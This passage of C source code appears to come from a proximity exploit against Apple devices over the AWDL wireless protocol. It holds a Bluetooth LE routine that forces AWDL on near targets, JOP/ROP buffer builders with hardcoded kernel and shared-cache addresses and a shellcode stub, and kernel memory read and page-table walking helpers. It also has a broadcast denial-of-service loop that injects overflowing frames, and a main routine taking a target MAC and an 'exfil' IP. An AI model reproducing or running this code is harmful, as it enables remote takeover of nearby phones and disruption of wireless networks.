    printf("found force enabled AWDL peer: %s\n", ether_ntoa(&sniffer_new_peer_mac));
    memcpy(awdl_interface_mac, &sniffer_new_peer_mac, sizeof(struct ether_addr));
    pthread_mutex_unlock(&force_enable_mutex);
    success = 1;
    break;

  }

  if (success) {
    printf("waiting for new peer sniffer thread to exit\n");
    pthread_join(peer_th, NULL);
  }

  //stop_advertising_hashes();
  return success;
}

void stop_btle() {
  fini_btle();
}

int prompt_to_continue() {
  char* line = NULL;
  size_t n = 0;
  ssize_t ret = getline(&line, &n, stdin);
  if (ret < 1) {
    if (line != NULL) {
      free(line);
    }
    return 0;
  }
  if (*line == 'y' || *line == 'Y') {
    free(line);
    return 1;
  }
  free(line);
  return 0;
}

// This is a JOP thingy I didn't use in the end

#define Q(page, offset) (*(uint64_t*)(page+offset))
#define D(page, offset) (*(uint32_t*)(page+offset))


#define PRIMITIVE_CALL_SINGLE_80(base, offset, fptr, arg_0, arg_1, arg_2, arg_3)    \
  /* mach_msg_header_t (0x18) */                                                    \
  wk32(base + offset + 0,    0); /* msgh_bits */                                            \
  wk32(base + offset + 0x4,  0x18+0x48+0x14); /* msgh_size */                             \
  wk32(base + offset + 0x14, 0x35); /* msgh_id */                                        \
                                                                                    \
  /* OSNotificationHeader64 (0x48) */                                               \
  wk32(base + offset+0x18+0x0, 0); /* size */                                          \
  wk32(base + offset+0x18+0x4, 150); /* type (kIOAsyncCompletionNotificationType) */   \
  wk64(base+ offset+0x18+0x10, fptr); /* func */ \
  wk64(base+ offset+0x18+0x18, arg_0); /* refCon */                                   \
                                                                                    \
  /* IOAsyncCompletionContent */                                                    \
  wk32(base+ offset+0x18+0x48+0x0, arg_1); /* result */                               \
  wk64(base+ offset+0x18+0x48+0x4,  arg_2); /* args[0] */                              \
  wk64(base+ offset+0x18+0x48+0xc,  arg_3); /* args[1] */

void build_jop_buffer(uint64_t base, uint64_t shared_cache_slide, uint64_t* initial_pc, uint64_t* initial_x0) {
  uint64_t IODispatchCalloutFromCFMessage = 0x1813DA7F8 + shared_cache_slide;
  uint64_t _xpc_array_apply_f = 0x180059B18 + shared_cache_slide;

  uint64_t ubase = 0x0000000FFFFFC000+0x800;

  wk64(base + 0x000, ubase+0x010);
  wk64(base + 0x008, 0x4141414141414141);
  wk64(base + 0x010, IODispatchCalloutFromCFMessage);
  wk64(base + 0x018, ubase+0x010);
  wk64(base + 0x020, _xpc_array_apply_f);
  wk64(base + 0x028, ubase+0x038);
  wk64(base + 0x030, 1);
  wk64(base + 0x038, ubase+0x080);
  wk64(base + 0x040, 0x4343434343434343);

  PRIMITIVE_CALL_SINGLE_80(base, 0x080, 0x4141414141414141,
                                        0x4242424242424242,
                                        0x43434343,
                                        0x4444444444444444,
                                        0x4545454545454545);

  *initial_pc = 0x18A9897D4 + shared_cache_slide;
  *initial_x0 = 0x0000000FFFFFC000+0x800-0x20; // this is hardcoding that we're starting 0x800 in to the commpage
}

struct thread_set_state_msg
{
  // mach_msg_header_t:
  uint32_t msgh_bits;
  uint32_t msgh_size;
  uint32_t msgh_remote_port;
  uint32_t msgh_local_port;
  uint32_t msgh_voucher_port;
  uint32_t msgh_id;
  
  // ndr_record_t
  uint64_t ndr; // 0x100000000;   +0x18
  
  uint32_t flavor; // 6 == ARM_THREAD_STATE64  +0x20
  
  uint32_t count; // 0x44
  
  // ARM_THREAD_STATE_64
  uint64_t __x[29]; /* General purpose registers x0-x28 */  // +0x28
  uint64_t __fp;    /* Frame pointer x29 */
  uint64_t __lr;    /* Link register x30 */
  uint64_t __sp;    /* Stack pointer x31 */
  uint64_t __pc;    /* Program counter */
  uint32_t __cpsr;  /* Current program status register */
  uint32_t __flags; /* Same size for 32-bit or 64-bit clients */
} __attribute__((packed));

// given an ipc_port pointer, look up its name in a task's space
uint32_t port_reverse_lookup(uint64_t task, uint64_t target_port) {
  uint64_t itk_space = rk64(task+0x320);
  uint32_t n_ports = rk32(itk_space+0x14);
  uint64_t ports_table = rk64(itk_space+0x20);

  // this is a linear buffer, should just read in chunks...
  for (int i = 1; i < n_ports; i++) {
    uint64_t port = rk64(ports_table+(i*0x18));
    if (port == target_port) {
      printf("found it, index 0x%x resolving name\n", i);
      uint32_t bits = rk32(ports_table+(i*0x18)+8);
      uint32_t name = (i<<8) | ((bits & 0xff000000) >> 24);
      printf("name: 0x%x\n", name);
      return name;
    }
  }
  return 0;
}

#define PTOV_TABLE_SIZE 8

typedef struct {
    uint64_t pa;
    uint64_t va;
    uint64_t len;
} ptov_table_entry;

ptov_table_entry ptov_table[PTOV_TABLE_SIZE] = {0};
uint64_t gVirtBase = 0;
uint64_t gPhysBase = 0;

void init_physmem(uint64_t kaslr_slide) {
  uint64_t ptov_table_address = 0xFFFFFFF0078CB0E8 + kaslr_slide;
  uint8_t* buf = arbitrary_read_fast(ptov_table_address, sizeof(ptov_table));
  if (!buf) {
    printf("failed to read ptov table...\n");
    return;
  }
  memcpy(ptov_table, buf, sizeof(ptov_table));
  free(buf);

  printf("ptov_table:\n");

  for (int i = 0; i < PTOV_TABLE_SIZE; i++) {
    ptov_table_entry* entry = &ptov_table[i];
    printf("pa: 0x%016llx va: 0x%016llx len: 0x%016llx\n", entry->pa, entry->va, entry->len);
  }

  gVirtBase = rk64(0xFFFFFFF0078CAF48 + kaslr_slide);
  gPhysBase = rk64(0xFFFFFFF0078CAF40 + kaslr_slide);
}

// XNU uses a "segmented physmap" which is why we need this table
uint64_t phystokv(uint64_t pa) {
  if (ptov_table[0].pa == 0) {
    printf("ptov table not initialized\n");
    return 0;
  }
  for (size_t i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
    if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len)))
      return (pa - ptov_table[i].pa + ptov_table[i].va);
  }


  return (pa - gPhysBase + gVirtBase);
}

// read through the physmap
uint64_t phys_read64(uint64_t pa) {
  uint64_t kv = phystokv(pa);
  return rk64(kv);
}

// thanks @_bazad
uint64_t
aarch64_page_table_lookup(uint64_t ttbr, uint64_t vaddr,
                          uint64_t *l1_tte_, uint64_t *l2_tte_, uint64_t *l3_tte_) {
    const uint64_t pg_bits = 14;
    const uint64_t l1_size = 3;
    const uint64_t l2_size = 11;
    const uint64_t l3_size = 11;
    const uint64_t tte_physaddr_mask = ((1uLL << 40) - 1) & ~((1 << pg_bits) - 1);
    uint64_t l1_index = (vaddr >> (l2_size + l3_size + pg_bits)) & ((1 << l1_size) - 1);
    uint64_t l2_index = (vaddr >> (l3_size + pg_bits)) & ((1 << l2_size) - 1);
    uint64_t l3_index = (vaddr >> pg_bits) & ((1 << l3_size) - 1);
    uint64_t pg_offset = vaddr & ((1 << pg_bits) - 1);
    uint64_t l1_table = ttbr;
    uint64_t l1_tte = phys_read64(l1_table + 8 * l1_index);
    if (l1_tte_ != NULL) {
        *l1_tte_ = l1_tte;
    }
    if ((l1_tte & 3) != 3) {
        return -1;
    }
    uint64_t l2_table = l1_tte & tte_physaddr_mask;
    uint64_t l2_tte = phys_read64(l2_table + 8 * l2_index);
    if (l2_tte_ != NULL) {
        *l2_tte_ = l2_tte;
    }
    if ((l2_tte & 3) != 3) {
        return -1;
    }
    uint64_t l3_table = l2_tte & tte_physaddr_mask;
    uint64_t l3_tte = phys_read64(l3_table + 8 * l3_index);
    if (l3_tte_ != NULL) {
        *l3_tte_ = l3_tte;
    }
    if ((l3_tte & 3) != 3) {
        return -1;
    }
    uint64_t frame = l3_tte & tte_physaddr_mask;
    return frame | pg_offset;
}

// TODO: this does too many reads!
uint64_t vm_map_lookup_entry(uint64_t vm_map, uint64_t address) {
  printf("vm_map_lookup_entry\n");
  printf("address: 0x%016llx\n", address);
  printf("vm_map: %016llx\n", vm_map);
  uint64_t rb_entry = rk64(vm_map+0x38);
  while (rb_entry != 0) {
    printf("rb_entry: 0x%016llx\n", rb_entry);
    uint64_t map_entry = rb_entry - 0x20;
    printf("map_entry: 0x%016llx\n", map_entry);
    uint64_t vme_start = rk64(map_entry+0x10);
    printf("vme_start: 0x%016llx\n", vme_start);
    if (address >= vme_start) {
      uint64_t vme_end = rk64(map_entry+0x18);
      printf("vme_end: 0x%016llx\n", vme_end);
      if (address < vme_end){
        return map_entry;
      }
      rb_entry = rk64(rb_entry+0x8);
    } else {
      rb_entry = rk64(rb_entry);
    }
  }
  return 0;
}

// UNUSED:
// I think this was a way to do a sort of weird JOP thing only using chained thread_set_state
// I abandoned it but will leave it in
void build_mach_msg_jop_buffer(uint64_t base, uint64_t user_base, uint64_t shared_cache_slide, uint64_t* initial_pc, uint64_t* initial_x0, uint32_t thread_self, uint32_t task_self) {
  struct thread_set_state_msg msg = {0};
  msg.msgh_bits = 0x13;
  msg.msgh_size = 0x138;
  msg.msgh_remote_port = thread_self;
  msg.msgh_id = 0xe14;

  msg.flavor = 6;
  msg.count = 0x44;
  msg.__x[0] = 0x103; // should look this up...
  msg.__x[1] = base-0x3e20; // don't hardcode this like this
  msg.__x[2] = 0x4000;
  msg.__x[3] = 0;
  msg.__x[4] = 0x01 | 0x04 ; //VM_PROT_READ | VM_PROT_EXECUTE
  msg.__x[5] = 0xf9000000f2e82840ULL; // shellcode stub! doesn't have to go here!

  msg.__lr = base+offsetof(struct thread_set_state_msg, __x[5]); // shellcode
  msg.__sp = 0x1C98784E0 + shared_cache_slide; // somewhere in the data segment for now..
  msg.__pc = 0x1802362A4 + shared_cache_slide; //mach_vm_protect
  msg.__cpsr = 0x80000000;


  wk32(base + offsetof(struct thread_set_state_msg, msgh_bits), 0x13);
  sleep(1);  
  //msgs.msg[0].msgh_size = 0x138;
  wk32(base + offsetof(struct thread_set_state_msg, msgh_size), 0x138);
  sleep(1);  

  //msgs.msg[0].msgh_remote_port = mach_thread_self();
  wk32(base + offsetof(struct thread_set_state_msg, msgh_remote_port), thread_self);
  sleep(1);  
  
  wk32(base + offsetof(struct thread_set_state_msg, msgh_local_port), 0);
  sleep(1);  
  
  wk32(base + offsetof(struct thread_set_state_msg, msgh_voucher_port), 0);
  sleep(1);  

  //msgs.msg[0].msgh_id = 0xe14;
  wk32(base + offsetof(struct thread_set_state_msg, msgh_id), 0xe14);
  sleep(1);  



  // for now as a hack we need to carefully split these writes up:
  //wkbuf_bundled(base, (uint8_t*)&msg.msgh_bits, 0x18);
  
  wk32(base + offsetof(struct thread_set_state_msg, flavor), 6);
  sleep(1);  
  wk32(base + offsetof(struct thread_set_state_msg, count), 0x44);
  sleep(1);  

  printf("task_self: 0x%x\n", task_self);
  wk64(base + offsetof(struct thread_set_state_msg, __x[0]), 0x4242424242424242);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __x[1]), user_base-0x3e20);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __x[2]), 0x4000);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __x[3]), 0);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __x[4]), 0x01 | 0x04);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __x[5]),  0xf9000000f2e82840UL);
  sleep(1);  


  wk64(base + offsetof(struct thread_set_state_msg, __lr),  user_base+offsetof(struct thread_set_state_msg, __x[5]));
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __sp),  0x1C98784E0 + shared_cache_slide);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __pc),  0x4141414141414141);//0x1802362A4 + shared_cache_slide);
  sleep(1);  
  wk64(base + offsetof(struct thread_set_state_msg, __cpsr), 0x80000000);
  sleep(1);  

  

  //wkbuf_bundled(base+offsetof(struct thread_set_state_msg, flavor), (uint8_t*)&msg.flavor, 4+4+(5*8));
  
  //wkbuf_bundled(base+offsetof(struct thread_set_state_msg, __pc), (uint8_t*)&msg.__lr, 0x20);
   

/*
  //msgs.msg[0].msgh_bits = 0x13;
  wk32(base + offsetof(struct thread_set_state_msg, msgh_bits), 0x13);
  
  //msgs.msg[0].msgh_size = 0x138;
  wk32(base + offsetof(struct thread_set_state_msg, msgh_size), 0x138);

  //msgs.msg[0].msgh_remote_port = mach_thread_self();
  wk32(base + offsetof(struct thread_set_state_msg, msgh_remote_port), thread_self);

  //msgs.msg[0].msgh_id = 0xe14;
  wk32(base + offsetof(struct thread_set_state_msg, msgh_id), 0xe14);

// ndr record ignored?    

  //msgs.msg[0].flavor = 6; // ARM_THREAD_STATE64
  wk32(base + offsetof(struct thread_set_state_msg, flavor), 6);

  //msgs.msg[0].count = 0x44;
  wk32(base + offsetof(struct thread_set_state_msg, count), 0x44);
  
  wk64(base + offsetof(struct thread_set_state_msg, __x[2]), 0xabcdef);

  //msgs.msg[0].__x[19] = &msgs.msg[1];

  //msgs.msg[0].__lr = chain_gadget;

  //msgs.msg[0].__sp = state.__sp;
  //msgs.msg[0].__pc = &say_hello;
  wk64(base + offsetof(struct thread_set_state_msg, __pc), 0x12345678);

  //msgs.msg[0].__cpsr = 0x80000000;
  wk32(base + offsetof(struct thread_set_state_msg, __cpsr), 0x80000000);
*/
  *initial_pc = 0x18022C1D0ULL + shared_cache_slide; // mach_msg_send
}

void broadcast_dos() {
  struct ether_addr broadcast_dst = *(ether_aton("ff:ff:ff:ff:ff:ff"));
  struct ether_addr spoof_src =  *(ether_aton("22:22:44:aa:00:00"));

  while (1) {
    for (int i = 0; i < 2048; i++) {
        *(((uint16_t*)&spoof_src)+2) = i;

        try_inject(RT(),
            WIFI(broadcast_dst, spoof_src),
            AWDL(),
            SYNC_PARAMS_6(),
            SERV_PARAM(),
            REPEAT(SERV_RESP_GROOM(59595), 40),
            HT_CAPS(),
            DATAPATH(spoof_src),
            PKT_END());
      *(((uint16_t*)&spoof_src)+2) = i;

      char overflower [1000] = {0};
      memset(overflower, 'A', 1000);
      try_inject(RT(),
          WIFI(broadcast_dst, spoof_src),
          AWDL(),
          SYNC_PARAMS_6(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(spoof_src),
          SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
          PKT_END());
    }
  }
}

int main(int argc, char** argv) {
  char errbuf[PCAP_ERRBUF_SIZE];

  if (argc < 2) {
    fail("need at least one argument");
  }

  if (argc < 5) {
    fail("./awdl_exploit <injection_interface> <monitor_interface> <ACK_phy> <target_mac> skip_btle_and_pop_calc");
  }

  int just_pop_calc = 1;
  
  if (argc == 6) {
    just_pop_calc = 1;
  }
  

  if (argc < 6) {
    printf("no ip\n");
    return 0;
  }
  exfil_ip = argv[5];


  //set_realtime_priority();

  char* interface_name = argv[1];
  char* second_interface_name = argv[2];
  char* phy_str = argv[3];

  log_msg("using interface: %s", interface_name);

  injection_interface_name = interface_name;

  set_high_injection_power_level();  

  pcap_t* pcap_handle = setup_wlan_device_faster(interface_name);
  global_pcap_handle = pcap_handle;
  
  pcap_t* second_pcap_handle = setup_wlan_device_faster_sniffer(second_interface_name);
  second_global_pcap_handle = second_pcap_handle;

  struct ether_addr* parsed_mac = ether_aton(argv[4]);
  if (parsed_mac == NULL) {
    fail("unable to parse target mac address");
  }

  struct ether_addr dst_mac = *parsed_mac;
  memcpy(&GLOBAL_TARGET_MAC, &dst_mac, 6);

  // set this to 1 for the broadcast denial-of-service demo
  int do_broadcast_dos = 0;

  if (do_broadcast_dos) {
    // start emiting any awdl advertisement:
    broadcast_any_awdl_hash("hci0");
    broadcast_dos();
  }

  //if (!just_pop_calc) {
    struct ether_addr force_enabled_target_awdl_mac = {0};
    int found_peer = force_enable_awdl("hci0", &force_enabled_target_awdl_mac);
    
    if (!found_peer) {
      printf("failed to kickstart AWDL on nearby peer...\n");
      stop_advertising_hashes();
      stop_btle();
      return 0;
    }

    printf("got new AWDL peer, will keep broadcasting btle contact hashes until exploit complete\n");

    printf("should exploit continue with force enabled target MAC: %s? (yes/no)\n", ether_ntoa(&force_enabled_target_awdl_mac));

    if (!prompt_to_continue()) {
      printf("aborting...\n");
      stop_advertising_hashes();
      stop_btle();
      return 0;
    }

    memcpy(&dst_mac, &force_enabled_target_awdl_mac, sizeof(struct ether_addr));
    memcpy(&GLOBAL_TARGET_MAC, &dst_mac, 6);
  //}

  // do awdl exploit
  // we keep broadcasting the target contact hashes to keep the target AWDL interface active during the exploit
  pthread_t ack_th;
  pthread_create(&ack_th, NULL, ACK_thread, NULL);
  
  // TODO: replace this with a mutex?
  usleep(500000);


///*********** exploit
  init_early_read(dst_mac, phy_str);
  exploit(dst_mac, just_pop_calc);
//***********/

  pthread_join(ack_th, NULL);

  sleep(10);

  //if (!just_pop_calc) {
    printf("done, stopping btle hash broadcast\n");

    stop_advertising_hashes();
    stop_btle();
  //}
  return 0;
#if 0
  pthread_t ack_th;
  pthread_create(&ack_th, NULL, ACK_thread, NULL);
  
  // TODO: replace this with a mutex?
  usleep(500000);


///*********** exploit
  init_early_read(dst_mac, phy_str);
  exploit(dst_mac);
//***********/
  pthread_join(ack_th, NULL);
#endif

  return 0;
}
